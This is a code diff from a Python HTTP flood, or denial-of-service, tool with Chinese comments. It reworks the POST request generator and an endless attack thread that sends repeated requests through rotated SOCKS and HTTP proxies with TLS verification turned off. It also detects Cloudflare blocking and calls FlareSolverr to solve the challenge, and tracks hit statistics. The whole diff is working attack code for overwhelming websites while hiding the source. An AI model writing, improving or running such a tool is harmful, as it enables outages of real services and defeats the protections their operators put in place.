@@ -383,15 +383,21 @@ def GenReqHeader(method):
     elif method == "post":
         post_host = f"POST {path} HTTP/1.1\r\nHost: {target}\r\n"
         
-        # 准备其他 Headers
-        content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
-        refer = f"Referer: http://{target}{path}\r\n"
+        # 准备POST数据
+        if data:
+            post_data = data
+        else:
+            # 生成随机POST数据
+            post_data = ''.join(random.choices(strings, k=random.randint(10, 100)))
         
-        # 准备 POST data
-        post_data = data if data else str(random._urandom(16))
-        length = f"Content-Length: {len(post_data)}\r\nConnection: Keep-Alive\r\n"
+        # 准备headers
+        content = "Content-Type: application/x-www-form-urlencoded\r\n"
+        content += "X-Requested-With: XMLHttpRequest\r\n"
+        refer = f"Referer: {protocol}://{target}{path}\r\n"
+        length = f"Content-Length: {len(post_data)}\r\n"
+        connection = "Connection: Keep-Alive\r\n"
         
-        # 处理 Cookies
+        # 处理Cookies
         cookie_header = ""
         if cf_cookies_str:
             cookie_header = cf_cookies_str
@@ -400,15 +406,22 @@ def GenReqHeader(method):
 
         # 组合所有部分
         if cf_headers_str:
-            # 如果 FlareSolverr 提供了 headers, 优先使用
-            # 假设 cf_headers_str 已经包含了 User-Agent 等
-            header = post_host + cf_headers_str + content + refer + length + cookie_header + "\r\n" + post_data + "\r\n\r\n"
+            user_agent = ""  # CF headers中可能已包含
+            accept = ""      # CF headers中可能已包含
+            # 从cf_headers_str中提取或使用默认值
+            if "User-Agent:" not in cf_headers_str:
+                user_agent = f"User-Agent: {getuseragent()}\r\n"
+            if "Accept:" not in cf_headers_str:
+                accept = Choice(acceptall)
         else:
-            # 否则, 手动生成
             user_agent = f"User-Agent: {getuseragent()}\r\n"
             accept = Choice(acceptall)
-            header = post_host + accept + refer + content + user_agent + length + cookie_header + "\r\n" + post_data + "\r\n\r\n"
-            
+        
+        # 构建完整请求
+        header = (post_host + accept + refer + content + user_agent + 
+                 length + connection + cookie_header + "\r\n" + 
+                 post_data + "\r\n\r\n")
+        
         return header
 
 def handle_response_with_cf_detection(s, header_gen_func, header_type="get"):
@@ -612,42 +625,106 @@ def head(event,proxy_type):
 			s.close()
 
 
-def post(event,proxy_type):
-	global USE_FLARESOLVERR, url, request_count  # ⚠️ 添加这行
-	request = GenReqHeader("post")
-	proxy = Choice(proxies).strip().split(":")
-	event.wait()
-	while True:
-		try:
-			s = socks.socksocket()
-			if proxy_type == 4:
-				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if proxy_type == 5:
-				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-			if proxy_type == 0:
-				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
-			if brute:
-				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-			s.connect((str(target), int(port)))
-			if protocol == "https":
-				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-				s = ctx.wrap_socket(s,server_hostname=target)
-			try:
-				for _ in range(100):
-					sent = s.send(str.encode(request))
-					if not sent:
-					    proxy = Choice(proxies).strip().split(":")
-					    update_stats_sample(is_error=True)
-					    break
-						
-					new_request = handle_response_with_cf_detection(s, GenReqHeader, "post")
-					if new_request:
-						request = new_request
-				s.close()
-			except:
-				s.close()
-		except:
-			s.close()
+def post(event, proxy_type):
+    global USE_FLARESOLVERR, url, request_count
+    request = GenReqHeader("post")
+    proxy = Choice(proxies).strip().split(":")
+    event.wait()
+    
+    error_count = 0
+    max_errors = 50
+    
+    while True:
+        try:
+            s = socks.socksocket()
+            if proxy_type == 4:
+                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+            elif proxy_type == 5:
+                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            elif proxy_type == 0:
+                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+            
+            if brute:
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            
+            s.settimeout(10)
+            s.connect((str(target), int(port)))
+            
+            if protocol == "https":
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                s = ctx.wrap_socket(s, server_hostname=target)
+            
+            # 连接成功，重置错误计数
+            error_count = 0
+            
+            try:
+                for _ in range(100):
+                    sent = s.send(str.encode(request))
+                    if not sent:
+                        proxy = Choice(proxies).strip().split(":")
+                        update_stats_simple(is_error=True)
+                        break
+                    
+                    # 尝试接收响应并统计
+                    try:
+                        response = s.recv(1024)
+                        status_code = parse_response(response)
+                        update_stats_simple(status_code=status_code)
+                        
+                        # 检测CF并更新header
+                        if is_cloudflare_blocked(response) and not USE_FLARESOLVERR:
+                            print(f"[CF检测] 发现Cloudflare拦截，正在启用绕过...")
+                            USE_FLARESOLVERR = True
+                            full_url = f"{protocol}://{target}:{port}{path}"
+                            if solve_cloudflare(full_url):
+                                print("[CF绕过] Cloudflare挑战已解决")
+                                request = GenReqHeader("post")
+                    except Exception as recv_error:
+                        update_stats_simple(is_error=True)
+                        # print(f"[DEBUG] Recv error: {recv_error}")  # 调试用
+                        
+                s.close()
+            except Exception as inner_error:
+                s.close()
+                update_stats_simple(is_error=True)
+                # print(f"[DEBUG] Inner loop error: {inner_error}")  # 调试用
+                
+        except Exception as outer_error:
+            s.close()
+            proxy = Choice(proxies).strip().split(":")
+            error_count += 1
+            update_stats_simple(is_error=True)
+            
+            # 每50次连续错误打印一次警告
+            if error_count % max_errors == 0:
+                print(f"[WARNING] POST线程连续失败 {error_count} 次，当前代理: {proxy[0]}:{proxy[1]}")
+                print(f"[DEBUG] 错误详情: {outer_error}")  # 调试用
+
+def update_stats_simple(status_code=None, is_error=False):
+    """简化的统计更新"""
+    global request_count, status_codes, error_count, success_count
+    
+    with stats_lock:
+        request_count += 1
+        
+        # 每个请求都进行基本统计，但只采样详细分析
+        if request_count % SAMPLE_RATE == 0:
+            if is_error:
+                error_count += 1
+                status_codes['ERROR'] += 1
+            elif status_code:
+                success_count += 1
+                status_codes[status_code] += 1
+            else:
+                # 未知状态也算作采样
+                error_count += 1
+                status_codes['UNKNOWN'] += 1
+        
+        # 打印统计
+        if request_count % REPORT_INTERVAL == 0:
+            print_stats()
 
 ''' idk why it's not working, so i temporarily removed it
 def slow_atk_conn(proxy_type,rlock):
